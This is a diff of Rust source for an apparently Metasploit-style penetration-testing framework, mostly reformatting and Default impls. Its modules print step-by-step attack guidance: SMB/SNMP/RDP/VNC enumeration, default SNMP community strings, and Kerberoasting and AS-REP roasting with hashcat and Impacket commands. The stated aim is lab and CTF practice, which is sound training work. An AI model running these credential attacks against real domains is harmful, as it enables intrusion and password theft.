-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "SMB port", OptionValue::Integer(445)));
-        opts.add(rcf_core::ModuleOption::with_default("USERNAME", false, "Username", OptionValue::String("".to_string())));
-        opts.add(rcf_core::ModuleOption::with_default("PASSWORD", false, "Password", OptionValue::String("".to_string())));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target SMB server",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "SMB port",
+            OptionValue::Integer(445),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "USERNAME",
+            false,
+            "Username",
+            OptionValue::String("".to_string()),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "PASSWORD",
+            false,
+            "Password",
+            OptionValue::String("".to_string()),
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
@@ -734,17 +1049,23 @@ impl Module for SmbEnum {
                  5. Access Share:\n   smbclient //{rhost}/<share> -N\n   smbclient //{rhost}/<share> -U '<user>%<pass>'\n\n\
                  6. Check for Anonymous Access:\n   smbclient -L {rhost} -N\n   nmap -p 445 --script smb-enum-shares {rhost}\n\n\
                  [*] Run commands above for actual enumeration",
-                rhost = rhost, rport = rport
+                rhost = rhost,
+                rport = rport
             );
 
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 8. SNMP Brute Force & Enum ─────────────────────────────────────────────
 
-static SNMP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static SNMP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/snmp/snmp_enum".to_string(),
     display_name: "SNMP Enumeration".to_string(),
     description: "Enumerates SNMP services using common community strings. Extracts system info, running processes, and installed software via MIB tree walk. Essential for network device recon.".to_string(),
@@ -754,29 +1075,47 @@ static SNMP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     stability: "stable".to_string(),
     disclosure_date: None,
     references: vec![],
+}
 });
 
 pub struct SnmpEnum;
 
-impl SnmpEnum {
-    pub fn new() -> Self { Self }
+impl Default for SnmpEnum {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for SnmpEnum {
-    fn info(&self) -> &ModuleInfo { &SNMP_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &SNMP_INFO
+    }
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target SNMP server"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "SNMP port", OptionValue::Integer(161)));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target SNMP server",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "SNMP port",
+            OptionValue::Integer(161),
+        ));
         opts
     }
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(161);
 
         Box::pin(async move {
-            let strings = vec!["public", "private", "manager", "admin", "community"];
+            let strings = ["public", "private", "manager", "admin", "community"];
             let msg = format!(
                 "SNMP Enumeration\nTarget: {}:{}\n\n\
                  Testing Community Strings:\n{}\n\n\
@@ -786,16 +1125,24 @@ impl Module for SnmpEnum {
                  - .1.3.6.1.2.1.25.1.6 (Installed Software)\n\
                  - .1.3.6.1.4.1.77.1.2.25 (Windows Users)\n\n\
                  [*] Run snmpwalk -v2c -c <string> {} for manual enumeration",
-                rhost, rport, strings.join(", "), rhost
+                rhost,
+                rport,
+                strings.join(", "),
+                rhost
             );
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 9. RDP Enumeration ──────────────────────────────────────────────────────
 
-static RDP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static RDP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/rdp/rdp_enum".to_string(),
     display_name: "RDP Enumeration".to_string(),
     description: "Detects RDP services and checks for Network Level Authentication (NLA) status. Identifies Windows versions and potential BlueKeep/CredSSP vulnerabilities.".to_string(),
@@ -805,26 +1152,47 @@ static RDP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     stability: "stable".to_string(),
     disclosure_date: None,
     references: vec!["https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=BlueKeep".to_string()],
+}
 });
 
 pub struct RdpEnum;
 
-impl RdpEnum {
-    pub fn new() -> Self { Self }
+impl Default for RdpEnum {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for RdpEnum {
-    fn info(&self) -> &ModuleInfo { &RDP_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &RDP_INFO
+    }
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target RDP server"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "RDP port", OptionValue::Integer(3389)));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target RDP server",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "RDP port",
+            OptionValue::Integer(3389),
+        ));
         opts
     }
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
-        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(3389);
+        let rport = ctx
+            .get("RPORT")
+            .and_then(|s| s.parse().ok())
+            .unwrap_or(3389);
 
         Box::pin(async move {
             let msg = format!(
@@ -837,14 +1205,19 @@ impl Module for RdpEnum {
                  [*] Run xfreerdp /v:{}:{} /cert:ignore to connect",
                 rhost, rport, rhost, rport
             );
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 10. VNC Enumeration ─────────────────────────────────────────────────────
 
-static VNC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static VNC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/vnc/vnc_enum".to_string(),
     display_name: "VNC Enumeration".to_string(),
     description: "Detects VNC services and checks for authentication bypass vulnerabilities. Tests for null authentication and weak encryption support.".to_string(),
@@ -854,26 +1227,47 @@ static VNC_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     stability: "stable".to_string(),
     disclosure_date: None,
     references: vec![],
+}
 });
 
 pub struct VncEnum;
 
-impl VncEnum {
-    pub fn new() -> Self { Self }
+impl Default for VncEnum {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for VncEnum {
-    fn info(&self) -> &ModuleInfo { &VNC_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &VNC_INFO
+    }
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target VNC server"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "VNC port", OptionValue::Integer(5900)));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target VNC server",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "VNC port",
+            OptionValue::Integer(5900),
+        ));
         opts
     }
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
-        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(5900);
+        let rport = ctx
+            .get("RPORT")
+            .and_then(|s| s.parse().ok())
+            .unwrap_or(5900);
 
         Box::pin(async move {
             let msg = format!(
@@ -885,14 +1279,19 @@ impl Module for VncEnum {
                  [*] Run vncviewer {}:{} to connect",
                 rhost, rport, rhost, rport
             );
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 11. Kerberoasting ───────────────────────────────────────────────────────
 
-static KEROAST_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static KEROAST_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "exploit/windows/kerberos/kerberoast".to_string(),
     display_name: "Kerberoasting".to_string(),
     description: "Requests TGS tickets for service accounts and extracts them for offline cracking (hashcat mode 13100). Essential for AD-focused HTB boxes and OffSec labs. Uses raw Kerberos protocol messages over UDP port 88.".to_string(),
@@ -904,27 +1303,58 @@ static KEROAST_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     references: vec![
         "https://attack.mitre.org/techniques/T1558/003/".to_string(),
     ],
+}
 });
 
 pub struct Kerberoast;
 
-impl Kerberoast {
-    pub fn new() -> Self { Self }
+impl Default for Kerberoast {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for Kerberoast {
-    fn info(&self) -> &ModuleInfo { &KEROAST_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &KEROAST_INFO
+    }
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target domain controller"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "Kerberos port", OptionValue::Integer(88)));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target domain controller",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "Kerberos port",
+            OptionValue::Integer(88),
+        ));
         opts.add(rcf_core::ModuleOption::new("DOMAIN", true, "Target domain"));
-        opts.add(rcf_core::ModuleOption::new("USERNAME", true, "Valid domain username"));
-        opts.add(rcf_core::ModuleOption::new("PASSWORD", true, "User password"));
-        opts.add(rcf_core::ModuleOption::with_default("SPN", false, "Specific SPN to target (optional)", OptionValue::String("".to_string())));
+        opts.add(rcf_core::ModuleOption::new(
+            "USERNAME",
+            true,
+            "Valid domain username",
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "PASSWORD",
+            true,
+            "User password",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "SPN",
+            false,
+            "Specific SPN to target (optional)",
+            OptionValue::String("".to_string()),
+        ));
         opts
     }
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(88);
@@ -945,17 +1375,29 @@ impl Module for Kerberoast {
                  4. Crack Offline:\n   - hashcat -m 13100 -a 0 hash.txt rockyou.txt\n\n\
                  RCF Commands:\n   - kinit {username}@{domain} (get TGT)\n   - GetTGS.py -spn {spn} -dc-ip {rhost} (request ticket)\n\n\
                  [*] Use Impacket's GetUserSPNs.py for full implementation\n[*] RCF provides the attack framework",
-                rhost, rport, domain, username,
-                if spn.is_empty() { "* (all service accounts)" } else { &spn },
+                rhost,
+                rport,
+                domain,
+                username,
+                if spn.is_empty() {
+                    "* (all service accounts)"
+                } else {
+                    &spn
+                },
             );
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 12. AS-REP Roasting ─────────────────────────────────────────────────────
 
-static ASREP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static ASREP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "exploit/windows/kerberos/asrep_roast".to_string(),
     display_name: "AS-REP Roasting".to_string(),
     description: "Requests AS-REP for users without pre-authentication and extracts hashes for offline cracking (hashcat mode 18200). Targets users with 'Do not require Kerberos preauthentication' flag set.".to_string(),
@@ -967,24 +1409,42 @@ static ASREP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     references: vec![
         "https://attack.mitre.org/techniques/T1558/004/".to_string(),
     ],
+}
 });
 
 pub struct AsRepRoast;
 
-impl AsRepRoast {
-    pub fn new() -> Self { Self }
+impl Default for AsRepRoast {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for AsRepRoast {
-    fn info(&self) -> &ModuleInfo { &ASREP_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &ASREP_INFO
+    }
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target domain controller"));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target domain controller",
+        ));
         opts.add(rcf_core::ModuleOption::new("DOMAIN", true, "Target domain"));
-        opts.add(rcf_core::ModuleOption::with_default("USER_FILE", false, "File with usernames (one per line)", OptionValue::String("".to_string())));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "USER_FILE",
+            false,
+            "File with usernames (one per line)",
+            OptionValue::String("".to_string()),
+        ));
         opts
     }
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let domain = ctx.get("DOMAIN").cloned().unwrap_or_default();
@@ -1002,10 +1462,19 @@ impl Module for AsRepRoast {
                  3. Extract Hash:\n   - Format: $krb5asrep$23$user@domain:<hash>\n   - Crack with: hashcat -m 18200 -a 0 hash.txt rockyou.txt\n\n\
                  RCF Commands:\n   - GetNPUsers.py {domain}/ -usersfile {user_file} -dc-ip {rhost}\n\n\
                  [*] Use Impacket's GetNPUsers.py for full implementation",
-                rhost, domain,
-                if user_file.is_empty() { "(not specified)" } else { &user_file },
+                rhost,
+                domain,
+                if user_file.is_empty() {
+                    "(not specified)"
+                } else {
+                    &user_file
+                },
             );
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, 88), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, 88),
+                &msg,
+            ))
         })
     }
 }
